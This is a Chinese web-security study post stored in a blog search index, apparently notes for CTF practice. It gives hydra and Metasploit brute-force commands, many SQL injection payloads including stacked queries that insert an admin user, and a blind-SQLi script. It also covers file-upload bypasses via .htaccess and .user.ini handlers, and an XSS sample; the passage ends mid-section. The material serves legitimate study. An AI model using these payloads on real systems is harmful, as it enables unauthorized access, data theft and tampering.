<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Web从0到1</title>
    <url>/2023/12/03/Web/Web%E4%BB%8E0%E5%88%B01/</url>
    <content><![CDATA[<h2 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h2><h3 id="端口服务的爆破"><a href="#端口服务的爆破" class="headerlink" title="端口服务的爆破"></a>端口服务的爆破</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http 80</span><br><span class="line">https 443</span><br><span class="line">ftp 21</span><br><span class="line">ssh 22</span><br><span class="line">mysql 3306</span><br><span class="line">mssql 1433</span><br><span class="line">rsync 873</span><br><span class="line">oracle 1521</span><br><span class="line">mongo 28017</span><br><span class="line">redis 6379</span><br><span class="line">tomcat 8080</span><br><span class="line">smtp 25</span><br><span class="line">POP3 110</span><br><span class="line">dns 53</span><br><span class="line">telent 23</span><br><span class="line">vnc 5900</span><br><span class="line">pcanywhere 5632</span><br><span class="line">Apache/Tomcat/Nginx/Axis2/resin/jboss 80|8080</span><br><span class="line">WebLogic 7001</span><br><span class="line">Jenkins 8080 8089</span><br><span class="line">SNMP 161</span><br><span class="line">Zabbix 8069</span><br><span class="line">elasticsearch 9200 9300</span><br><span class="line">rdp 3389</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p>利用Kali中的<code>hydra</code>工具进行服务密码的爆破，或者是<code>xHydra</code>图形化界面。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hydra -l root -P passlist.txt ssh://192.168.1.0 -V -t 15		# -v/V 显示爆破过程，-t 设置线程</span><br><span class="line">hydra -L user.txt -P passlist.txt ssh://192.168.1.0 -f -t 15		# -f/F 当找到正确的登陆密码就退出</span><br><span class="line">hydra -L user.txt -P passlist.txt mssql://192.168.1.0 -f -V</span><br><span class="line">hydra -L user.txt -P passlist.txt 192.168.1.0 -f -V mssql</span><br><span class="line">hydra -l root -P passlist.txt mysql://192.168.1.0 -f -V -s 3306		# -s 指定非默认端口</span><br><span class="line">hydra -l root -P passlist.txt mysql://192.168.1.0 -f -V -o target.txt		# -o 结果保存文件</span><br><span class="line">hydra -P /root/passlist.txt -e nsr 192.168.0.101 redis</span><br><span class="line">hydra -L user.txt -P passlist.txt -M ip.txt -o target.txt mysql		# -M 遍历列举的IP</span><br></pre></td></tr></table></figure>

<p>利用Kali中的<code>metasploit</code>模块。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">--------------------------------------</span><br><span class="line">auxiliary/scanner/ftp/ftp_login</span><br><span class="line">auxiliary/scanner/ssh/ssh_login</span><br><span class="line">auxiliary/scanner/telnet/telnet_login</span><br><span class="line">auxiliary/scanner/smb/smb_login</span><br><span class="line">auxiliary/scanner/mssql/mssql_login</span><br><span class="line">auxiliary/scanner/mysql/mysql_login</span><br><span class="line">auxiliary/scanner/oracle/oracle_login</span><br><span class="line">auxiliary/scanner/postgres/postgres_login</span><br><span class="line">auxiliary/scanner/vnc/vnc_login</span><br><span class="line">auxiliary/scanner/pcanywhere/pcanywhere_login</span><br><span class="line">auxiliary/scanner/snmp/snmp_login</span><br><span class="line">--------------------------------------</span><br><span class="line">msf6 &gt; use auxiliary/scanner/ssh/ssh_login</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; info		# 查看有关信息</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; set RHOSTS 192.168.0.66</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; set USERNAME root</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; set PASS_FILE /root/passlist.txt</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; set STOP_ON_SUCCESS true</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; show options</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; run</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; back</span><br></pre></td></tr></table></figure>

<p>邮箱服务的爆破，利用<code>MailCracker</code>工具。</p>
<h3 id="后台密码的爆破"><a href="#后台密码的爆破" class="headerlink" title="后台密码的爆破"></a>后台密码的爆破</h3><p>常用到<code>burpsuite</code>的爆破模块，分为4种:</p>
<ul>
<li>Sniper：一个一个爆破，payload只能设置一个。</li>
<li>Battering ram：如果设置两个以上参数，那么每次爆破时每个参数的值都相同，同时遍历字典，比如<code>pld=[a, b]</code>那么爆破的情况就是<code>arg1=a, arg2=a</code>和<code>arg1=b, arg2=b</code>。</li>
<li>Pitchfork：需要设置两个以上参数，参数会同时开始遍历不同的字典，次数以字典少的为准，比如<code>pld1=[a, b]</code>，<code>pld2=[c, d]</code>，那么爆破的情况就是<code>arg1=a, arg2=c</code>和<code>arg1=b, arg2=d</code>。</li>
<li>Cluster bomb：需要设置两个以上的参数，爆破的次数是payload的笛卡尔积，简单理解就是所有情况都来一遍。</li>
</ul>
<p>有验证码如何破解。验证码和cookie是否可以重复利用？验证码是否可以识别？</p>
<h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><h3 id="Mysql-注入基础"><a href="#Mysql-注入基础" class="headerlink" title="Mysql 注入基础"></a>Mysql 注入基础</h3><p>常用注释<code>#</code>，<code>--</code>，<code>空格</code>，<code>/**/</code>。<br>内联注释<code>/*!&lt;code&gt;*/</code></p>
<p>万能字典：<a href="https://blog.csdn.net/weixin_41594045/article/details/102469315">(22条消息) SQL注入万能密码字典_JacobTsang的博客-CSDN博客</a></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="built_in">system_user</span>()	系统用户名</span><br><span class="line"><span class="keyword">user</span>()			用户名</span><br><span class="line"><span class="built_in">current_user</span>() 	当前用户名</span><br><span class="line"><span class="built_in">session_user</span>()	连接数据库的用户名</span><br><span class="line">database() 		数据库名</span><br><span class="line">version() 		MYSQL数据库版本</span><br><span class="line">load_file() 	MYSQL读取本地文件的函数</span><br><span class="line">@<span class="variable">@datadir</span> 		读取数据库路径</span><br><span class="line">@<span class="variable">@basedir</span> MYSQL 	安装路径</span><br><span class="line">@<span class="variable">@version_compile_os</span> 	操作系统</span><br><span class="line">@<span class="variable">@secure_file_priv</span>		文件读写属性</span><br><span class="line"></span><br><span class="line"><span class="operator">!</span><span class="operator">!</span> mysql版本大于<span class="number">5.0</span> <span class="operator">!</span><span class="operator">!</span></span><br><span class="line"></span><br><span class="line">information_schema.schemate		记录所有数据库名的表</span><br><span class="line">information_schema.schemate.schema_name		数据库名的字段</span><br><span class="line"></span><br><span class="line">information_schema.tables		记录所有表名信息的表</span><br><span class="line">information_schema.tables.table_name		表名的字段</span><br><span class="line">information_schema.tables.table_schema		数据库名的字段</span><br><span class="line"></span><br><span class="line">information_schema.columns		记录所有列名信息的表</span><br><span class="line">information_schema.columns.column_name		列名的字段</span><br><span class="line">information_schema.columns.table_name		表名的字段</span><br><span class="line">information_schema.tables.table_schema		数据库名的字段</span><br></pre></td></tr></table></figure>

<h3 id="Boolean-注入"><a href="#Boolean-注入" class="headerlink" title="Boolean 注入"></a><strong>Boolean 注入</strong></h3><p>输入SQL注入检测语句判断页面是否不一样，如果输入检测语句页面没有任何改变可以使用延时语句进行检测<code>1&#39; and sleep(10)--+</code>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// substr(startIndex, length)方法的第二个参数是截取字符串的长度</span><br><span class="line">// substring(startIndex, endIndex)方法的第二个参数是截取字符串最终的下标</span><br><span class="line"></span><br><span class="line">1&#x27; and if(1=1,1,0)--+</span><br><span class="line">1&#x27; and if(1=2,1,0)--+</span><br><span class="line"></span><br><span class="line">1&#x27; and length(database())&gt;=1--+</span><br><span class="line">1&#x27; and if(length(database())=4,1,0)--+</span><br><span class="line"></span><br><span class="line">1&#x27; and substr(database(),1,1)=&#x27;t&#x27;--+</span><br><span class="line">1&#x27; and ord(substr(database(),1,1))=115--+</span><br><span class="line">1&#x27; and if(substring(datacase(),1,1)=&#x27;d&#x27;,1,0)--+</span><br><span class="line"></span><br><span class="line">1&#x27; and if(substring((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)=&#x27;g&#x27;,1,0)--+</span><br><span class="line">1&#x27; and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)=&#x27;e&#x27;--+</span><br><span class="line"></span><br><span class="line">1&#x27; and if(substring((select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=&#x27;users&#x27; limit 1,1),1,1)=&#x27;u&#x27;,1,0)--+</span><br><span class="line"></span><br><span class="line">1&#x27; and if(substring((select CONCAT(user,0x3a,PASSWORD) from users limit 1),1,1)=&#x27;a&#x27;,1,0)--+</span><br></pre></td></tr></table></figure>

<p>自己做题写的一个脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># payload</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">url = <span class="string">&quot;http://6686e800-4b04-4274-a2e9-74bef679521d.node4.buuoj.cn:81/index.php&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">&quot;-&#123;abcdefghijklmnopqrstuvwxyz0123456789&#125;&quot;</span>:</span><br><span class="line">        data = &#123;<span class="string">&quot;id&quot;</span>: <span class="string">&quot;if(ascii(substring((select(flag)from(flag)),&#123;&#125;,1))=&#123;&#125;,1,2)&quot;</span>.<span class="built_in">format</span>(i, <span class="built_in">ord</span>(j))&#125;</span><br><span class="line">        res = requests.post(url, data=data)</span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;glzjin&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>程序在开发期间需要告诉使用者某些报错信息方便管理员进行调试，定位文件错误。特别 php 在执行 SQL 语句时一般都会采用异常处理函数，捕获错误信息。在 php 中使用<code>mysql_error()</code>函数，如果 SQL 注入存在时，会有报错信息返回，可以采用报错注入。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and (updatexml(1,concat(0x7e,(select user()),0x7e),1))--+</span><br><span class="line">1&#x27; and (select 1 from(select count(),concat(user(),floor(rand(0)2))x from information_schema.tables group by x)a)--+</span><br><span class="line">1&#x27; and (extractvalue(1,concat(0x7e,(select user()),0x7e)))--+</span><br><span class="line">1&#x27; and (updatexml(1,concat(0x7e,(select user()),0x7e),1))--+</span><br><span class="line">1&#x27; and geometrycollection((select * from(select * from(select user())a)b))--+</span><br><span class="line">1&#x27; and multipoint((select * from(select * from(select user())a)b))--+</span><br><span class="line">1&#x27; and polygon((select * from(select * from(select user())a)b))--+</span><br><span class="line">1&#x27; and multipolygon((select * from(select * from(select user())a)b))--+</span><br><span class="line">1&#x27; and linestring((select * from(select * from(select user())a)b))--+</span><br><span class="line">1&#x27; and multilinestring((select * from(select * from(select user())a)b))--+</span><br><span class="line">1&#x27; and exp(~(select * from(select user())a))--+</span><br></pre></td></tr></table></figure>

<h3 id="时间注入"><a href="#时间注入" class="headerlink" title="时间注入"></a>时间注入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(length(database())&gt;1,sleep(5),0)</span><br><span class="line">-1&#x27; or if(length(database())&gt;1,sleep(5),0)--+</span><br><span class="line"></span><br><span class="line">if(substr(database(),1,1)=&#x27;s&#x27;,sleep(5),1)</span><br><span class="line">-1&#x27; or if(substr(database(),1,1)=&#x27;s&#x27;,sleep(5),1)--+</span><br></pre></td></tr></table></figure>

<h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>堆叠查询可以执行多条 SQL 语句，语句之间以分号隔开，在 mysql 里<code>mysqli_multi_query</code>和<code>mysql_multi_query</code>这两个函数执行一个或多个针对数据库的查询。但是堆叠查询只能返回第一条查询信息，不返回后面的信息。堆叠注入的危害是很大的可以任意使用增删改查的语句，例如删除数据库修改数据库，添加数据库用户。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;;show database()#</span><br><span class="line">-1&#x27;;select if(substr(user(),1,1)=&#x27;r&#x27;,sleep(5),0)#</span><br><span class="line"></span><br><span class="line">-1&#x27;;insert into users values(10,&#x27;admin&#x27;,&#x27;123456&#x27;)--+</span><br><span class="line">-1&#x27;;insert into users(id,username,password)values(1000,&#x27;admin&#x27;,&#x27;123456&#x27;)--+</span><br></pre></td></tr></table></figure>

<h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p>在第一次进行数据库插入数据的时候，仅仅只是使用了<code>addslashes</code>或者是借助<code>get_magic_quotes_gpc</code>对其中的特殊字符进行了转义，虽然参数在过滤后会添加<code>\</code>进行转义，但是<code>\</code>并不会插入到数据库中，在写入数据库的时候还是保留了原来的数据。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5.jpg" alt="二次注入"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; order by 1#</span><br><span class="line">id = &#x27;1&#x27; order by 1#&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="绕过技巧"><a href="#绕过技巧" class="headerlink" title="绕过技巧"></a>绕过技巧</h3><table>
<thead>
<tr>
<th>绕过效果</th>
<th>绕过方法</th>
</tr>
</thead>
<tbody><tr>
<td>空格字符绕过</td>
<td>%20，%09，%0a，%0b，%0c，%0d，%a0，%00，<code>/**/</code>，<code>/*!*/</code></td>
</tr>
<tr>
<td>大小写绕过</td>
<td>select * from users where id&#x3D;1 UniON SelECT 1,2,3,4;</td>
</tr>
<tr>
<td>引号绕过</td>
<td>select * from users where username&#x3D;0x61646D696E;</td>
</tr>
<tr>
<td>脚本语言特性绕过</td>
<td>id&#x3D;1%00&amp;id&#x3D;2 union select 1,2,3（waf 截断）</td>
</tr>
<tr>
<td>逗号绕过</td>
<td>查询当前库第一个字符<br />select * from users where id&#x3D;1 and ‘m’&#x3D;(select(substr(database() from 1 for 1)));<br />select * from users where id&#x3D;1 and 0x6D&#x3D;(select(substr(database() from 1 for 1)));<br />select * from users where id&#x3D;1 and 0x6D&#x3D;(select(mid(database() from 1 for 1)));</td>
</tr>
<tr>
<td>or and xor not</td>
<td>id&#x3D;1 and 1&#x3D;1 等于 id&#x3D;1 &amp;&amp; 1&#x3D;1<br />id&#x3D;1 or 1&#x3D;1 等于 id&#x3D;1 || 1&#x3D;1<br />id&#x3D;1 &amp;&amp; 2&#x3D;1+1</td>
</tr>
<tr>
<td>等号绕过</td>
<td>select * from users where id&#x3D;1 and ascii(substring(user(),1,1))&gt;115;<br /><br />检查第一个字母是否以”r” 开头<br />select * from users where id&#x3D;1 and (select substring(user(),1,1) like ‘r%’);<br />select * from users where id&#x3D;1 and 1&#x3D;(select user() regexp ‘^r’);</td>
</tr>
<tr>
<td>二次编码绕过</td>
<td>源代码里有 urldecode 函数对字符 url 解码</td>
</tr>
<tr>
<td>多参数拆分绕过</td>
<td>-1’ union &#x2F;* &amp;username&#x3D;*&#x2F;select 1,user(),3,4–+</td>
</tr>
</tbody></table>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/%E8%84%9A%E6%9C%AC%E8%AF%AD%E8%A8%80%E7%89%B9%E6%80%A7.jpg"></p>
<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="代码表现"><a href="#代码表现" class="headerlink" title="代码表现"></a>代码表现</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;upload.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>选择文件:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;上传&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 检查文件是否成功上传</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>]) &amp;&amp; <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;error&#x27;</span>] === <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 指定文件上传目录</span></span><br><span class="line">    <span class="variable">$upload_dir</span> = <span class="string">&#x27;uploads/&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 生成唯一的文件名</span></span><br><span class="line">    <span class="variable">$file_name</span> = <span class="title function_ invoke__">uniqid</span>() . <span class="string">&#x27;_&#x27;</span> . <span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将文件从临时目录移动到指定的目录</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$upload_dir</span> . <span class="variable">$file_name</span>)) &#123;</span><br><span class="line">        <span class="comment">// 显示上传的文件信息</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;文件上传成功！&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;文件名：&quot;</span> . <span class="variable">$file_name</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;文件大小：&quot;</span> . <span class="title function_ invoke__">filesize</span>(<span class="variable">$upload_dir</span> . <span class="variable">$file_name</span>) . <span class="string">&quot; bytes&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;文件上传失败！错误码：&quot;</span> . <span class="variable">$file</span>[<span class="string">&#x27;error&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;文件上传失败！错误码：&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;error&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>PHP中相关文件上传错误码：</p>
<ul>
<li><p><code>UPLOAD_ERR_OK</code>：值为 0，表示上传成功，没有错误发生。</p>
</li>
<li><p><code>UPLOAD_ERR_INI_SIZE</code>：值为 1，表示上传的文件大小超出了 <code>php.ini</code> 文件中 <code>upload_max_filesize</code> 指令所设置的大小限制。</p>
</li>
<li><p><code>UPLOAD_ERR_FORM_SIZE</code>：值为 2，表示上传的文件大小超出了 HTML 表单中 <code>MAX_FILE_SIZE</code> 指令所设置的大小限制。</p>
</li>
<li><p><code>UPLOAD_ERR_PARTIAL</code>：值为 3，表示文件只有部分被上传。</p>
</li>
<li><p><code>UPLOAD_ERR_NO_FILE</code>：值为 4，表示没有文件被上传。</p>
</li>
<li><p><code>UPLOAD_ERR_NO_TMP_DIR</code>：值为 6，表示找不到临时目录。</p>
</li>
<li><p><code>UPLOAD_ERR_CANT_WRITE</code>：值为 7，表示文件写入失败。</p>
</li>
<li><p><code>UPLOAD_ERR_EXTENSION</code>：值为 8，表示文件上传被扩展阻止。</p>
</li>
</ul>
<h3 id="绕过技巧-1"><a href="#绕过技巧-1" class="headerlink" title="绕过技巧"></a>绕过技巧</h3><p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/upload.jpg" alt="upload"></p>
<ul>
<li><p>黑名单绕过</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">asp	asa	cdx cer</span><br><span class="line">aspx ashx			<span class="comment">// 允许 .net 执行</span></span><br><span class="line">php php3 php.a shtml phtml</span><br><span class="line"></span><br><span class="line"><span class="comment">// 大小写，双写绕过</span></span><br><span class="line">Php PHP phphpp</span><br><span class="line">    </span><br><span class="line"><span class="comment">// 空格绕过</span></span><br><span class="line">filename=<span class="string">&quot;shell.php   &quot;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">// windows 系统特征绕过</span></span><br><span class="line">filename=<span class="string">&quot;shell.php.&quot;</span></span><br><span class="line">filename=<span class="string">&quot;shell.php::<span class="subst">$DATA</span>&quot;</span></span><br><span class="line">    </span><br><span class="line">filename=<span class="string">&quot;a.php:.jpg&quot;</span>		<span class="comment">// 生成空白的 a.php</span></span><br><span class="line">filename=<span class="string">&quot;a.&gt;&gt;&gt;&quot;</span>			<span class="comment">// 写入数据</span></span><br></pre></td></tr></table></figure>

<p>结合 burpsuite 进行后缀名的批量检测</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.php</span><br><span class="line">.php5</span><br><span class="line">.php4</span><br><span class="line">.php3</span><br><span class="line">.php2</span><br><span class="line">.html</span><br><span class="line">.htm</span><br><span class="line">.phtml</span><br><span class="line">.pht</span><br><span class="line">.pHp</span><br><span class="line">.phP</span><br><span class="line">.pHp5</span><br><span class="line">.pHp4</span><br><span class="line">.pHp3</span><br><span class="line">.pHp2</span><br><span class="line">.Html</span><br><span class="line">.Htm</span><br><span class="line">.pHtml</span><br><span class="line">.jsp</span><br><span class="line">.jspa</span><br><span class="line">.jspx</span><br><span class="line">.jsw</span><br><span class="line">.jsv</span><br><span class="line">.jspf</span><br><span class="line">.jtml</span><br><span class="line">.jSp</span><br><span class="line">.jSpx</span><br><span class="line">.jSpa</span><br><span class="line">.jSw</span><br><span class="line">.jSv</span><br><span class="line">.jSpf</span><br><span class="line">.jHtml</span><br><span class="line">.asp</span><br><span class="line">.aspx</span><br><span class="line">.asa</span><br><span class="line">.asax</span><br><span class="line">.ascx</span><br><span class="line">.ashx</span><br><span class="line">.asmx</span><br><span class="line">.cer</span><br><span class="line">.aSp</span><br><span class="line">.aSpx</span><br><span class="line">.aSa</span><br><span class="line">.aSax</span><br><span class="line">.aScx</span><br><span class="line">.aShx</span><br><span class="line">.aSmx</span><br><span class="line">.cEr</span><br><span class="line">.sWf</span><br><span class="line">.swf</span><br><span class="line">.htaccess</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>.htaccess</code>重写解析</p>
<p>通过.htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。 <strong>.htaccess文件可以在网站目录树的任何一个目录中，只对该文件所在目录中的文件和子目录有效。</strong></p>
<p>满足条件：</p>
<ul>
<li><code>mod_rewrite</code>模块开启</li>
<li><code>AllowOverride All</code>（Apache 低于 2.3.8 版本默认为All）</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;IfModule mime_module&gt;</span><br><span class="line"># 在当前目录下，只针对 gif 文件会解析成 php 代码执行</span><br><span class="line">AddHandler php5-script .gif</span><br><span class="line"># 在当前目录下，所有文件都会被解析成 php 代码执行</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/IfModule&gt;</span><br><span class="line"></span><br><span class="line">&lt;IfModule mime_module&gt;</span><br><span class="line">AddType application/x-httpd-php .gif</span><br><span class="line">&lt;/IfModule&gt;</span><br><span class="line"></span><br><span class="line">&lt;FilesMatch &quot;evil.gif&quot;&gt;</span><br><span class="line"># 在当前目录下，如果匹配到 evil.gif 文件，则被解析成 php 代码执行</span><br><span class="line">SetHandler application/x-httpd-php  </span><br><span class="line"># 在当前目录下，如果匹配到 evil.gif 文件，则被解析成 php 代码执行</span><br><span class="line">AddHandler php5-script .gif</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>.user.ini</code>文件绕过</p>
<p>需要 PHP 版本大于等于 5.3.0，在 PHP_INI_PERDIR 中可以利用的两个模式</p>
<ul>
<li>auto_prepend_file ：指定一个文件在主文件解析前解析</li>
<li>auto_append_file ：指定一个文件在主文件解析后解析</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">auto_prepend_file=shell.gif</span><br><span class="line">auto_append_file=shell.gif</span><br></pre></td></tr></table></figure>
</li>
<li><p>图片二次渲染绕过</p>
<p>有些图片上传，会对上传的图片进行二次渲染后在保存，体积可能会更小，图片会模糊一些，但是符合网站的需求。二次渲染后的图片内容会减少，如果里面包含后门代码，可能会被省略。导致上传的图片马，恶意代码被清除。使用<code>imagecreatefromgif</code>函数对图片进行二次生成。二次渲染攻击最好用<code>gif</code>图片马。</p>
</li>
<li><p>IIS6 中<code>*.asp</code>文件夹下的所有文件都会被当作脚本进行解析；文件名为<code>a.asp;a.jpg</code>会被解析为 ASP 文件。</p>
</li>
<li><p>条件竞争上传</p>
<p>在文件上传时，如果逻辑不对，会造成很大危害，例如文件上传时，用 move_uploaded_file 把上传的临时文件移动到指定目录，接着再用 rename 文件设置为图片格式，如果在 rename 之前 move_uploaded_file 这个步骤如果这个文件可被客户端访问，这样我们也可以获取一个 webshell。</p>
<p>首先不断提交访问上传后的文件路径，然后不断提交文件上传的数据包，建议线程设置大一点。</p>
</li>
</ul>
<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>XSS（跨站脚本）漏洞是一种常见的Web安全漏洞，它可以允许攻击者将恶意代码注入到Web页面中，以获取用户的敏感信息，如会话cookie、个人资料等。攻击者可以利用XSS漏洞来欺骗用户，例如通过发送恶意电子邮件或钓鱼链接来引诱用户访问受感染的页面。</p>
<p><strong>Chrome等浏览器会对部分XSS进行拦截，不过不会过滤一些Javascript代码</strong>。</p>
<h3 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h3><p>XSS漏洞可以根据攻击者注入恶意脚本的位置和影响范围进行分类。以下是常见的XSS漏洞分类：</p>
<ol>
<li><p>存储型XSS漏洞：攻击者将恶意脚本注入到Web应用程序的数据库或其他数据存储区域中，当其他用户访问包含恶意脚本的页面时，这些脚本将被执行，从而导致攻击成功。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;title&gt;存储型XSS漏洞示例&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;h1&gt;欢迎来到我们的网站！&lt;/h1&gt;</span><br><span class="line">	&lt;form method=&quot;POST&quot; action=&quot;http://example.com/add_comment&quot;&gt;</span><br><span class="line">		&lt;label for=&quot;name&quot;&gt;姓名:&lt;/label&gt;</span><br><span class="line">		&lt;input type=&quot;text&quot; id=&quot;name&quot; name=&quot;name&quot;&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">		&lt;label for=&quot;comment&quot;&gt;评论:&lt;/label&gt;</span><br><span class="line">		&lt;textarea id=&quot;comment&quot; name=&quot;comment&quot;&gt;&lt;/textarea&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">		&lt;button type=&quot;submit&quot;&gt;提交评论&lt;/button&gt;</span><br><span class="line">	&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(&#x27;你的账户已被攻击！&#x27;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>反射型XSS漏洞：攻击者将恶意脚本注入到Web应用程序的URL参数中，当用户点击恶意链接时，脚本将被执行，从而导致攻击成功。</p>
